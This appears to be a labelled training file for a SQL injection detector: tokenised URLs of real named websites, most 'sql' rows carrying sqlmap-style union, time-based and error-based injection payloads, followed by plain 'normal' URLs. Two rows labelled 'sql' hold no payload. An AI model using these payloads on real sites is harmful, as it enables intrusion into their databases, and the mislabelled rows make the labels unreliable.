1,sql,http : / / www . romanianwriters . ro / s . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN
256,sql,https : / / www . studyastronomy . com / courses . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
257,sql,http : / / kyoukaigun . jp / visit / detail . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
258,sql,http : / / www . traditionalcottages . gr / page . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj
259,sql,https : / / primes . utm . edu / top20 / page . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - nBvv
260,sql,http : / / www . strategictransitions . com / productDetail . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
261,sql,http : / / www . signsinthecity . net / info . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
262,sql,http : / / www . wsid . info / mod / page / view . php ? id = 1 ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' zLoF ' = ' zLoF
263,sql,http : / / www . walpax . com . br / beachresorts . php ? id = 1 % ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' 
265,sql,http : / / www . czga . ro / pagina . php ? id = 1 % ' UNION ALL SELECT NULL - - rJyU
266,sql,http : / / victorhospital . com / services . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - fmtt
267,sql,http : / / www . hrvatskonumizmatickodrustvo . hr / index . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
268,sql,http : / / www . medistock . fr / en / catalogue . php ? id = 1 ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' BOxx ' = ' BOxx
269,sql,http : / / www . tunesoman . com / product . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu
270,sql,https : / / www . agencevu . com / photographers / photographer . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
271,sql,http : / / xn - - 90abdeg4afamkcabfvi7a8q . xn - - p1ai / page . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' 
272,sql,https : / / www . becker - international . com / index . php ? id = 1 ORDER BY 1 - - kzEn
273,sql,http : / / www . mcfolsom . com / page . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - rvrn
274,sql,http : / / www . world - art . ru / people . php ? id = ( SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
275,sql,http : / / xn - - n1addli . xn - - p1ai / index . php ? id = 1 UNION ALL SELECT NULL - - uRNf
276,sql,http : / / www . wenggroup . com / product . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
277,sql,https : / / www . cathouseonthekings . com / video / webcam . php ? id = 1 ORDER BY 4721 - - gPsZ
278,sql,http : / / www . pacific - textiles . com / businesses_facilities . php ? id = 1 AND SLEEP ( 5 ) - - THvg
279,sql,http : / / www . accessibleireland . com / category . php ? id = 1 ) AND 5836 = 4675 AND ( 5312 = 5312
280,sql,http : / / www . vaganova . ru / page . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) 
281,sql,http : / / vill . hakuba . nagano . jp / livecam / livecamera . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' 
282,sql,http : / / www . nagarapro . co . jp / top / artist / artist . php ? id = 1 ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
283,sql,http : / / www . nhf . org . bd / aboutus . php ? id = 1 AND SLEEP ( 5 ) - - THvg
284,sql,http : / / www . radimpex . rs / download . php ? id = 1 ) AND SLEEP ( 5 ) AND ( 7824 = 7824
285,sql,https : / / pubgshowcase . com / containers . php ? id = 1 ' ) UNION ALL SELECT NULL - - eEGL
286,sql,http : / / www . seehydropower . eu / download_tools / details . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
287,sql,https : / / unite . ut . ee / posts . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn
288,sql,http : / / www . arabterm . org / index . php ? id = 1 AND 3611 = 3611 - - SJqY
289,sql,https : / / www . forum - pianoteq . com / viewforum . php ? id = 1 ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' BOxx ' = ' BOxx
290,sql,http : / / www . yitechnology . com / support - faq . php ? id = ( SELECT CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 3360 = 3360 , 1 ) ) ) , 0x7171717871 ) ) 
291,sql,http : / / www . brahmos . com / content . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn
292,sql,https : / / www . flapjackfunds . com / program . php ? id = 1;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
293,sql,http : / / corp . toei - anim . co . jp / en / film / pickup . php ? id = 1 ' ORDER BY 6555 - - CoTc
295,sql,http : / / www . iias - trieste - maribor . eu / index . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) - - NonP
296,sql,http : / / www . m - e - l . fr / fiche - education - artistique . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj
297,sql,http : / / www . rancinan . com / official / photos . php ? id = 1 % ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' % ' = ' 
299,sql,http : / / www . mherc . mb . ca / page . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm
300,sql,http : / / molvica . org / vesti_content . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu
301,sql,http : / / www . dreamville - bg . com / ru / complex . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
302,sql,http : / / www . thespastudios . com / p . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121
303,sql,https : / / www . i - cpan . es / detallePregunta . php ? id = 1 ' ) ORDER BY 1 - - tslS
304,sql,http : / / www . tomkane . com / section . php ? id = 1 ) ORDER BY 1 - - zRhc
305,sql,http : / / www . belmos . ru / transp - artcl . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL - - TLHU
306,sql,https : / / 74 . ru / forum / view . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
307,sql,http : / / www . lecoshop . ru / dir . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
308,sql,http : / / www . jevicko . cz / index . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
309,sql,http : / / www . vlktravel . com / tour . php ? id = 1 ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( 1264 = 1264
310,sql,http : / / www . anm - conso . com / prof - 03 . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - bDCI
311,sql,https : / / www . filter . ru / index . php ? id = 1 ' ;SELECT PG_SLEEP ( 5 ) - - 
312,sql,http : / / ohiofoodbanks . org / programs / programs . php ? id = 6787
314,sql,http : / / 2017 . tiff - jp . net / ja / lineup / works . php ? id = 1 ' ORDER BY 1 - - Hgvf
315,sql,http : / / www . sriaurobindoashram . org / music / sunil / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - wXih
316,sql,http : / / eurofo . ru / m / viewforum . php ? id = 1 ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( 1264 = 1264
318,sql,http : / / animatch . ca / machform / view . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL - - utDw
319,sql,http : / / www . sydneyshoot . com / buy . php ? id = 1 ) ORDER BY 1 - - zRhc
320,sql,http : / / www . theartofdicktwinney . com / statment . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' 
321,sql,https : / / place . fi . ncsu . edu / local / catalog / section . php ? id = 1 ) ORDER BY 1 - - zRhc
322,sql,http : / / www2 . ntnu . edu . tw / modules / tinyd0 / index . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu
323,sql,http : / / www . hits . pt / gca / index . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn
324,sql,http : / / www . warbears . com / missions . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - ApsM
325,sql,https : / / www . hcilondon . in / pages . php ? id = 5845
326,sql,http : / / www . firstreception . gov . gr / content . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm
327,sql,http : / / www . opera - amsterdam . nl / pages . php ? id = 1 % ' ORDER BY 7815 - - mzUV
331,sql,http : / / www . ubraintv . com / watchchannel . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
332,sql,https : / / www . skau . sk / page . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475
333,sql,https : / / www . tukui . org / addons . php ? id = 1 ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( 2513 = 2513
334,sql,http : / / www . semsk . kz / newscat . php ? id = 1 ' ) ORDER BY 1 - - tslS
335,sql,http : / / www . msosocal . com / subpages / leadership_bio . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
336,sql,http : / / pravo . ua / events . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn
337,sql,http : / / www . rainbow . com . my / support . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - sBcc
338,sql,https : / / www . softube . com / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx
339,sql,http : / / www . chicken . org . au / page . php ? id = 1 ' ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( ' eWKx ' = ' eWKx
341,sql,http : / / www . oardc . ohio - state . edu / weedguide / single_weed . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - spUE
343,sql,http : / / bagfa . de / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
344,sql,https : / / likumi . lv / doc . php ? id = ( SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
345,sql,https : / / earthobservatory . nasa . gov / IOTD / view . php ? id = 1 ) ORDER BY 4287 - - vRlT
350,sql,https : / / www . otzyv . ru / read . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
358,sql,http : / / dailyjinnah . com / epaper / page . php ? id = 1 ) WAITFOR DELAY ' 0 : 0 : 5 ' AND ( 5754 = 5754
359,sql,http : / / dailyjinnah . com / epaper / page . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) 
360,sql,http : / / dailyjinnah . com / epaper / page . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - gXRN
367,sql,https : / / antizapret . info / org . php ? id = 1 ORDER BY 1 - - lAea
368,normal,http : / / www . romanianwriters . ro / s . php ? id = 1
369,normal,http : / / www . bible - history . com / subcat . php ? id = 1
370,normal,http : / / ruscongrmech2015 . ru / index . php ? id = 1
371,normal,http : / / berkeleyrecycling . org / page . php ? id = 1
372,normal,http : / / www . xrayrisk . com / calculator / calculator - normal - studies . php ? id = 1
373,normal,http : / / 193 . 232 . 218 . 56 / web - local / prep / rj / index . php ? id = 1
375,normal,https : / / www . fleurlis . com . tw / en / wedding . php ? id = 1
376,normal,http : / / www . dipintoguitars . com / category . php ? id = 1
377,normal,http : / / www . teamgear . us / store . php ? id = 1
378,normal,http : / / www . multan . gov . pk / files . php ? id = 1
379,normal,http : / / www . asfaa . org / members . php ? id = 1
380,normal,http : / / www . bpc . gov . bd / contactus . php ? id = 1
381,normal,https : / / metacarpolis . com / index . php ? id = 1
382,normal,http : / / www . jbctools . com / cataleg . php ? id = 1
384,normal,http : / / ansobor . ru / page . php ? id = 1
385,normal,http : / / www . khrunichev . ru / main . php ? id = 1
386,normal,http : / / www . studentvote . ca / 2011 / results / index . php ? id = 1
387,normal,https : / / www . orthphoto . net / user . php ? id = 1
388,normal,http : / / esjindex . org / search . php ? id = 1
389,normal,http : / / www . sansihotels . com / hotels . php ? id = 1
390,normal,http : / / www . adopfrance . fr / gb / galerie / index . php ? id = 1
391,normal,http : / / www . akko . org . il / map_en . php ? id = 1
392,normal,http : / / www . paranatural . net / index . php ? id = 1
393,normal,http : / / www . photobiology . org / asp . php ? id = 1
396,normal,http : / / www . stateofdesign . berlin / subevents . php ? id = 1
397,normal,https : / / www . acme . in / contentpage . php ? id = 1
398,normal,http : / / www . komiaviatrans . ru / airport / index . php ? id = 1
399,normal,http : / / www . cdep . ru / index . php ? id = 60 % 26step = 1
400,normal,http : / / www . peml . com / login . php ? rtn_url = http : / / www . peml . com / category . php ? id = 1
401,normal,http : / / www . palfi . net / partners . php ? id = 1
402,normal,http : / / www . sabella . fr / fiche . php ? id = 1
403,normal,http : / / electronautomotive . com / order . php ? id = 1
404,normal,http : / / en . firenze - online . com / shops / florence - shop . php ? id = 1
405,normal,http : / / www . pidsphil . org / journal_info . php ? id = 1
406,normal,http : / / www . egscomics . com / index . php ? id = 1
407,normal,https : / / 100wonders . ru / index . php ? id = 1
408,normal,http : / / www . ifsb . org / membership . php ? id = 1
409,normal,https : / / www . ocsalumni . org / events / cart . php ? id = 1
410,normal,http : / / www . ssy . org / detail . php ? id = 1
411,normal,http : / / www . micwaudio . com / product . php ? id = 1
412,normal,http : / / www . smart - ground . eu / partner . php ? id = 1
413,normal,http : / / www . lambbuilding . co . uk / members / profile . php ? id = 1
414,normal,http : / / www . minutesemeiotic . org / home . php ? id = 1
415,normal,http : / / pedlib . ru / katalogy / katalog . php ? id = 1
416,normal,http : / / bestindustrygroup . com / news . php ? id = 1
417,normal,http : / / cityvis . io / detail . php ? id = 1
418,normal,http : / / www . fairtradegroupnepal . org / about . php ? id = 1
419,normal,http : / / www . cacert . org / index . php ? id = 1
420,normal,http : / / koshi . fr / achat / produit_details . php ? id = 1
421,normal,http : / / vlab . co . in / ba_labs_all . php ? id = 1
422,normal,http : / / ewfed . com / cat . php ? id = 1
423,normal,https : / / www . kunstreservebank . nl / index . php ? id = 1 % 26lang = EN
424,normal,http : / / www . cqfa . ca / public / index . php ? id = 1
425,normal,https : / / www . free - country - flags . com / flag_pack . php ? id = 1
426,normal,http : / / www . carrot - home . com / project . php ? id = 1
427,normal,https : / / www . partnerschulnetz . de / index . php ? id = 562 % 26L = 1
428,normal,https : / / www . albinagroup . com / products . php ? id = 1
429,normal,http : / / modniditky . com / katalog . php ? id = 1
430,normal,http : / / www . evanscartoons . com / gallery . php ? id = 1
